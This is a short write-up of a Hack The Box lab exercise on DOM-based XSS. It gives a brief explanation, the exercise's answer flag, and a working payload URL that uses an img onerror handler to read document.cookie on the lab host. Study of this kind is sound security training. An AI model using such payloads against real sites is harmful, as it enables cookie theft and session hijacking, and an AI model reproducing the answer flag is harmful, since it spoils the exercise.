# DOM XSS
While reflected XSS sends the input data to the back-end server through HTTP requests, DOM XSS is completely processed on the client-side through JavaScript. DOM XSS occurs when JavaScript is used to change the page source through the Document Object Model (DOM).

## Questions
1. To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url. **Answer: HTB{pur3ly_cl13n7_51d3}**
   - Use this payload: `http://154.57.164.81:32150/?#task=%3Cimg/src/onerror=alert(document.cookie)%3E`